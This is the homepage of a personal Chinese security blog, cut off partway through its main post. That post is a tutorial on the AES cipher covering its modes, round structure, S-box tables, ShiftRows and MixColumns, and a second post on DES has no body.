<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">


  <link rel="mask-icon" href="/images/favicon.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/stom.xml" title="Goudan's blog" type="application/atom+xml">






<meta name="description" content="Stay Hungry,Stay Foolish">
<meta name="keywords" content="CTF,渗透">
<meta property="og:type" content="website">
<meta property="og:title" content="Goudan&#39;s blog">
<meta property="og:url" content="http://goudanjun.vip/index.html">
<meta property="og:site_name" content="Goudan&#39;s blog">
<meta property="og:description" content="Stay Hungry,Stay Foolish">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Goudan&#39;s blog">
<meta name="twitter:description" content="Stay Hungry,Stay Foolish">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://goudanjun.vip/">





  <title>Goudan's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Goudan's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-xssplatform">
          <a href="http://j36f673471.zicp.vip/xssme/index.php" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-XSSPlatform"></i> <br>
            
            XSSPlatform
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/16/DES加密.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/16/DES加密.html/" itemprop="url">DES加密</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-16T17:21:59+08:00">
                2021-03-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  0 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/15/AES加密.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/15/AES加密.html/" itemprop="url">AES加密</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-15T15:36:18+08:00">
                2021-03-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  3.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  15 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="AES加密简介"><a href="#AES加密简介" class="headerlink" title="AES加密简介"></a>AES加密简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的<strong>对称加密算法</strong>(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p>
<p><img src="https://i.loli.net/2021/03/15/Gdi4zT2KFLkxcIO.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MDgyOTA5Njg4"></p>
<p>设AES加密函数为E，则 C = E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。</p>
<p>设AES解密函数为D，则 P = D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。</p>
<h2 id="AES的五种加密模式"><a href="#AES的五种加密模式" class="headerlink" title="AES的五种加密模式"></a>AES的五种加密模式</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>将明文分成若干相同的小段，并对每一小段进行加密</p>
<h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p>
<p><img src="https://i.loli.net/2021/03/16/jTWyhB87a9uk512.png" alt="12232506-27faefa42fde42d28bef168b20736a61"></p>
<h3 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h3><p>在CTR模式中， 有一个自增的算子，这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密。这种加密方式简单快速，安全可靠，而且可以并行加密，但是在计算器不能维持很长的情况下，密钥只能使用一次。</p>
<p><img src="https://i.loli.net/2021/03/16/ZfFoPThA4jd3BGa.png" alt="12232517-b33f83764ff249d9b1d8bb236baa20e0"></p>
<h3 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h3><p><img src="https://i.loli.net/2021/03/16/4ZuULWrABYHQdJK.png" alt="12232528-c5c4946255a849379be143aaca8d1ecf"></p>
<h3 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h3><p><img src="https://i.loli.net/2021/03/16/vMam286ITSgdGWO.png" alt="12232542-349b69872d274aa797cee9ef848a550e"></p>
<h1 id="ECB加密详解"><a href="#ECB加密详解" class="headerlink" title="ECB加密详解"></a>ECB加密详解</h1><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p>
<table>
<thead>
<tr>
<th>AES</th>
<th>密钥长度（32位比特字)</th>
<th>分组长度(32位比特字)</th>
<th>加密轮数</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>4</td>
<td>4</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>6</td>
<td>4</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>8</td>
<td>4</td>
<td>14</td>
</tr>
</tbody></table>
<p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br>上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p>
<p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：</p>
<p><img src="https://i.loli.net/2021/03/16/Nnf4tZhzLOu8Yml.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTMyNTQ4OTA2"></p>
<p>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：</p>
<p><img src="https://i.loli.net/2021/03/16/kHFJRf7qdTgyM2G.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTM0NzIyODEy"></p>
<p>上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p>
<p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：</p>
<p><img src="https://i.loli.net/2021/03/16/4LUOCelbpgDmi9d.jpg" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTUyNjM4MzI0"></p>
<p>上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p>
<p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。</p>
<p><img src="https://i.loli.net/2021/03/16/kRmDf6EIrtVNJqG.jpg" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTYxMjAyNDg1"></p>
<p>上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。</p>
<p>这里当加密的首尾都有密钥参与的时候增加了算法的安全性。</p>
<h2 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h2><h3 id="字节代换操作"><a href="#字节代换操作" class="headerlink" title="字节代换操作"></a>字节代换操作</h3><p>这里定义了S盒：</p>
<table>
<thead>
<tr>
<th>行/列</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x63</td>
<td>0x7c</td>
<td>0x77</td>
<td>0x7b</td>
<td>0xf2</td>
<td>0x6b</td>
<td>0x6f</td>
<td>0xc5</td>
<td>0x30</td>
<td>0x01</td>
<td>0x67</td>
<td>0x2b</td>
<td>0xfe</td>
<td>0xd7</td>
<td>0xab</td>
<td>0x76</td>
</tr>
<tr>
<td>1</td>
<td>0xca</td>
<td>0x82</td>
<td>0xc9</td>
<td>0x7d</td>
<td>0xfa</td>
<td>0x59</td>
<td>0x47</td>
<td>0xf0</td>
<td>0xad</td>
<td>0xd4</td>
<td>0xa2</td>
<td>0xaf</td>
<td>0x9c</td>
<td>0xa4</td>
<td>0x72</td>
<td>0xc0</td>
</tr>
<tr>
<td>2</td>
<td>0xb7</td>
<td>0xfd</td>
<td>0x93</td>
<td>0x26</td>
<td>0x36</td>
<td>0x3f</td>
<td>0xf7</td>
<td>0xcc</td>
<td>0x34</td>
<td>0xa5</td>
<td>0xe5</td>
<td>0xf1</td>
<td>0x71</td>
<td>0xd8</td>
<td>0x31</td>
<td>0x15</td>
</tr>
<tr>
<td>3</td>
<td>0x04</td>
<td>0xc7</td>
<td>0x23</td>
<td>0xc3</td>
<td>0x18</td>
<td>0x96</td>
<td>0x05</td>
<td>0x9a</td>
<td>0x07</td>
<td>0x12</td>
<td>0x80</td>
<td>0xe2</td>
<td>0xeb</td>
<td>0x27</td>
<td>0xb2</td>
<td>0x75</td>
</tr>
<tr>
<td>4</td>
<td>0x09</td>
<td>0x83</td>
<td>0x2c</td>
<td>0x1a</td>
<td>0x1b</td>
<td>0x6e</td>
<td>0x5a</td>
<td>0xa0</td>
<td>0x52</td>
<td>0x3b</td>
<td>0xd6</td>
<td>0xb3</td>
<td>0x29</td>
<td>0xe3</td>
<td>0x2f</td>
<td>0x84</td>
</tr>
<tr>
<td>5</td>
<td>0x53</td>
<td>0xd1</td>
<td>0x00</td>
<td>0xed</td>
<td>0x20</td>
<td>0xfc</td>
<td>0xb1</td>
<td>0x5b</td>
<td>0x6a</td>
<td>0xcb</td>
<td>0xbe</td>
<td>0x39</td>
<td>0x4a</td>
<td>0x4c</td>
<td>0x58</td>
<td>0xcf</td>
</tr>
<tr>
<td>6</td>
<td>0xd0</td>
<td>0xef</td>
<td>0xaa</td>
<td>0xfb</td>
<td>0x43</td>
<td>0x4d</td>
<td>0x33</td>
<td>0x85</td>
<td>0x45</td>
<td>0xf9</td>
<td>0x02</td>
<td>0x7f</td>
<td>0x50</td>
<td>0x3c</td>
<td>0x9f</td>
<td>0xa8</td>
</tr>
<tr>
<td>7</td>
<td>0x51</td>
<td>0xa3</td>
<td>0x40</td>
<td>0x8f</td>
<td>0x92</td>
<td>0x9d</td>
<td>0x38</td>
<td>0xf5</td>
<td>0xbc</td>
<td>0xb6</td>
<td>0xda</td>
<td>0x21</td>
<td>0x10</td>
<td>0xff</td>
<td>0xf3</td>
<td>0xd2</td>
</tr>
<tr>
<td>8</td>
<td>0xcd</td>
<td>0x0c</td>
<td>0x13</td>
<td>0xec</td>
<td>0x5f</td>
<td>0x97</td>
<td>0x44</td>
<td>0x17</td>
<td>0xc4</td>
<td>0xa7</td>
<td>0x7e</td>
<td>0x3d</td>
<td>0x64</td>
<td>0x5d</td>
<td>0x19</td>
<td>0x73</td>
</tr>
<tr>
<td>9</td>
<td>0x60</td>
<td>0x81</td>
<td>0x4f</td>
<td>0xdc</td>
<td>0x22</td>
<td>0x2a</td>
<td>0x90</td>
<td>0x88</td>
<td>0x46</td>
<td>0xee</td>
<td>0xb8</td>
<td>0x14</td>
<td>0xde</td>
<td>0x5e</td>
<td>0x0b</td>
<td>0xdb</td>
</tr>
<tr>
<td>A</td>
<td>0xe0</td>
<td>0x32</td>
<td>0x3a</td>
<td>0x0a</td>
<td>0x49</td>
<td>0x06</td>
<td>0x24</td>
<td>0x5c</td>
<td>0xc2</td>
<td>0xd3</td>
<td>0xac</td>
<td>0x62</td>
<td>0x91</td>
<td>0x95</td>
<td>0xe4</td>
<td>0x79</td>
</tr>
<tr>
<td>B</td>
<td>0xe7</td>
<td>0xc8</td>
<td>0x37</td>
<td>0x6d</td>
<td>0x8d</td>
<td>0xd5</td>
<td>0x4e</td>
<td>0xa9</td>
<td>0x6c</td>
<td>0x56</td>
<td>0xf4</td>
<td>0xea</td>
<td>0x65</td>
<td>0x7a</td>
<td>0xae</td>
<td>0x08</td>
</tr>
<tr>
<td>C</td>
<td>0xba</td>
<td>0x78</td>
<td>0x25</td>
<td>0x2e</td>
<td>0x1c</td>
<td>0xa6</td>
<td>0xb4</td>
<td>0xc6</td>
<td>0xe8</td>
<td>0xdd</td>
<td>0x74</td>
<td>0x1f</td>
<td>0x4b</td>
<td>0xbd</td>
<td>0x8b</td>
<td>0x8a</td>
</tr>
<tr>
<td>D</td>
<td>0x70</td>
<td>0x3e</td>
<td>0xb5</td>
<td>0x66</td>
<td>0x48</td>
<td>0x03</td>
<td>0xf6</td>
<td>0x0e</td>
<td>0x61</td>
<td>0x35</td>
<td>0x57</td>
<td>0xb9</td>
<td>0x86</td>
<td>0xc1</td>
<td>0x1d</td>
<td>0x9e</td>
</tr>
<tr>
<td>E</td>
<td>0xe1</td>
<td>0xf8</td>
<td>0x98</td>
<td>0x11</td>
<td>0x69</td>
<td>0xd9</td>
<td>0x8e</td>
<td>0x94</td>
<td>0x9b</td>
<td>0x1e</td>
<td>0x87</td>
<td>0xe9</td>
<td>0xce</td>
<td>0x55</td>
<td>0x28</td>
<td>0xdf</td>
</tr>
<tr>
<td>F</td>
<td>0x8c</td>
<td>0xa1</td>
<td>0x89</td>
<td>0x0d</td>
<td>0xbf</td>
<td>0xe6</td>
<td>0x42</td>
<td>0x68</td>
<td>0x41</td>
<td>0x99</td>
<td>0x2d</td>
<td>0x0f</td>
<td>0xb0</td>
<td>0x54</td>
<td>0xbb</td>
<td>0x16</td>
</tr>
</tbody></table>
<p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：<br><img src="https://i.loli.net/2021/03/16/GLYh5RmyIUz12Je.png" alt="字节变换"></p>
<h3 id="字节逆代换操作"><a href="#字节逆代换操作" class="headerlink" title="字节逆代换操作"></a>字节逆代换操作</h3><p>逆S盒：</p>
<table>
<thead>
<tr>
<th>行/列</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x52</td>
<td>0x09</td>
<td>0x6a</td>
<td>0xd5</td>
<td>0x30</td>
<td>0x36</td>
<td>0xa5</td>
<td>0x38</td>
<td>0xbf</td>
<td>0x40</td>
<td>0xa3</td>
<td>0x9e</td>
<td>0x81</td>
<td>0xf3</td>
<td>0xd7</td>
<td>0xfb</td>
</tr>
<tr>
<td>1</td>
<td>0x7c</td>
<td>0xe3</td>
<td>0x39</td>
<td>0x82</td>
<td>0x9b</td>
<td>0x2f</td>
<td>0xff</td>
<td>0x87</td>
<td>0x34</td>
<td>0x8e</td>
<td>0x43</td>
<td>0x44</td>
<td>0xc4</td>
<td>0xde</td>
<td>0xe9</td>
<td>0xcb</td>
</tr>
<tr>
<td>2</td>
<td>0x54</td>
<td>0x7b</td>
<td>0x94</td>
<td>0x32</td>
<td>0xa6</td>
<td>0xc2</td>
<td>0x23</td>
<td>0x3d</td>
<td>0xee</td>
<td>0x4c</td>
<td>0x95</td>
<td>0x0b</td>
<td>0x42</td>
<td>0xfa</td>
<td>0xc3</td>
<td>0x4e</td>
</tr>
<tr>
<td>3</td>
<td>0x08</td>
<td>0x2e</td>
<td>0xa1</td>
<td>0x66</td>
<td>0x28</td>
<td>0xd9</td>
<td>0x24</td>
<td>0xb2</td>
<td>0x76</td>
<td>0x5b</td>
<td>0xa2</td>
<td>0x49</td>
<td>0x6d</td>
<td>0x8b</td>
<td>0xd1</td>
<td>0x25</td>
</tr>
<tr>
<td>4</td>
<td>0x72</td>
<td>0xf8</td>
<td>0xf6</td>
<td>0x64</td>
<td>0x86</td>
<td>0x68</td>
<td>0x98</td>
<td>0x16</td>
<td>0xd4</td>
<td>0xa4</td>
<td>0x5c</td>
<td>0xcc</td>
<td>0x5d</td>
<td>0x65</td>
<td>0xb6</td>
<td>0x92</td>
</tr>
<tr>
<td>5</td>
<td>0x6c</td>
<td>0x70</td>
<td>0x48</td>
<td>0x50</td>
<td>0xfd</td>
<td>0xed</td>
<td>0xb9</td>
<td>0xda</td>
<td>0x5e</td>
<td>0x15</td>
<td>0x46</td>
<td>0x57</td>
<td>0xa7</td>
<td>0x8d</td>
<td>0x9d</td>
<td>0x84</td>
</tr>
<tr>
<td>6</td>
<td>0x90</td>
<td>0xd8</td>
<td>0xab</td>
<td>0x00</td>
<td>0x8c</td>
<td>0xbc</td>
<td>0xd3</td>
<td>0x0a</td>
<td>0xf7</td>
<td>0xe4</td>
<td>0x58</td>
<td>0x05</td>
<td>0xb8</td>
<td>0xb3</td>
<td>0x45</td>
<td>0x06</td>
</tr>
<tr>
<td>7</td>
<td>0xd0</td>
<td>0x2c</td>
<td>0x1e</td>
<td>0x8f</td>
<td>0xca</td>
<td>0x3f</td>
<td>0x0f</td>
<td>0x02</td>
<td>0xc1</td>
<td>0xaf</td>
<td>0xbd</td>
<td>0x03</td>
<td>0x01</td>
<td>0x13</td>
<td>0x8a</td>
<td>0x6b</td>
</tr>
<tr>
<td>8</td>
<td>0x3a</td>
<td>0x91</td>
<td>0x11</td>
<td>0x41</td>
<td>0x4f</td>
<td>0x67</td>
<td>0xdc</td>
<td>0xea</td>
<td>0x97</td>
<td>0xf2</td>
<td>0xcf</td>
<td>0xce</td>
<td>0xf0</td>
<td>0xb4</td>
<td>0xe6</td>
<td>0x73</td>
</tr>
<tr>
<td>9</td>
<td>0x96</td>
<td>0xac</td>
<td>0x74</td>
<td>0x22</td>
<td>0xe7</td>
<td>0xad</td>
<td>0x35</td>
<td>0x85</td>
<td>0xe2</td>
<td>0xf9</td>
<td>0x37</td>
<td>0xe8</td>
<td>0x1c</td>
<td>0x75</td>
<td>0xdf</td>
<td>0x6e</td>
</tr>
<tr>
<td>A</td>
<td>0x47</td>
<td>0xf1</td>
<td>0x1a</td>
<td>0x71</td>
<td>0x1d</td>
<td>0x29</td>
<td>0xc5</td>
<td>0x89</td>
<td>0x6f</td>
<td>0xb7</td>
<td>0x62</td>
<td>0x0e</td>
<td>0xaa</td>
<td>0x18</td>
<td>0xbe</td>
<td>0x1b</td>
</tr>
<tr>
<td>B</td>
<td>0xfc</td>
<td>0x56</td>
<td>0x3e</td>
<td>0x4b</td>
<td>0xc6</td>
<td>0xd2</td>
<td>0x79</td>
<td>0x20</td>
<td>0x9a</td>
<td>0xdb</td>
<td>0xc0</td>
<td>0xfe</td>
<td>0x78</td>
<td>0xcd</td>
<td>0x5a</td>
<td>0xf4</td>
</tr>
<tr>
<td>C</td>
<td>0x1f</td>
<td>0xdd</td>
<td>0xa8</td>
<td>0x33</td>
<td>0x88</td>
<td>0x07</td>
<td>0xc7</td>
<td>0x31</td>
<td>0xb1</td>
<td>0x12</td>
<td>0x10</td>
<td>0x59</td>
<td>0x27</td>
<td>0x80</td>
<td>0xec</td>
<td>0x5f</td>
</tr>
<tr>
<td>D</td>
<td>0x60</td>
<td>0x51</td>
<td>0x7f</td>
<td>0xa9</td>
<td>0x19</td>
<td>0xb5</td>
<td>0x4a</td>
<td>0x0d</td>
<td>0x2d</td>
<td>0xe5</td>
<td>0x7a</td>
<td>0x9f</td>
<td>0x93</td>
<td>0xc9</td>
<td>0x9c</td>
<td>0xef</td>
</tr>
<tr>
<td>E</td>
<td>0xa0</td>
<td>0xe0</td>
<td>0x3b</td>
<td>0x4d</td>
<td>0xae</td>
<td>0x2a</td>
<td>0xf5</td>
<td>0xb0</td>
<td>0xc8</td>
<td>0xeb</td>
<td>0xbb</td>
<td>0x3c</td>
<td>0x83</td>
<td>0x53</td>
<td>0x99</td>
<td>0x61</td>
</tr>
<tr>
<td>F</td>
<td>0x17</td>
<td>0x2b</td>
<td>0x04</td>
<td>0x7e</td>
<td>0xba</td>
<td>0x77</td>
<td>0xd6</td>
<td>0x26</td>
<td>0xe1</td>
<td>0x69</td>
<td>0x14</td>
<td>0x63</td>
<td>0x55</td>
<td>0x21</td>
<td>0x0c</td>
<td>0x7d</td>
</tr>
</tbody></table>
<h2 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h2><h3 id="行移位操作"><a href="#行移位操作" class="headerlink" title="行移位操作"></a>行移位操作</h3><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p>
<p><img src="https://i.loli.net/2021/03/16/ZFwtBYvK5UDqH8p.jpg" alt="shiftRows"></p>
<h3 id="行移位的逆变换"><a href="#行移位的逆变换" class="headerlink" title="行移位的逆变换"></a>行移位的逆变换</h3><p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。</p>
<h2 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h2><h3 id="列混合操作"><a href="#列混合操作" class="headerlink" title="列混合操作"></a>列混合操作</h3><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<img src="https://i.loli.net/2021/03/16/CEM5wJhtB9T4G7H.png" alt="col"></p>
<p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：</p>
<p><img src="https://i.loli.net/2021/03/16/SOBAQWxIjV8NsYe.png" alt="col2"></p>
<p>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1 = (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示：</p>
<p><img src="https://i.loli.net/2021/03/16/XlzIHbsLn7FQ1Ac.png" alt="col3"></p>
<p>也就是说，如果a7为1，则进行异或运算，否则不进行。<br>类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：</p>
<p><img src="https://i.loli.net/2021/03/16/8KFwQzSA26DcHsP.png" alt="col4"></p>
<p>乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：</p>
<p><img src="https://i.loli.net/2021/03/16/vjO1Zn3u48LFWly.png" alt="在这里插入图片描述"></p>
<p>因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。<br>下面举个具体的例子,输入的状态矩阵如下：</p>
<table>
<thead>
<tr>
<th>C9</th>
<th>E5</th>
<th>FD</th>
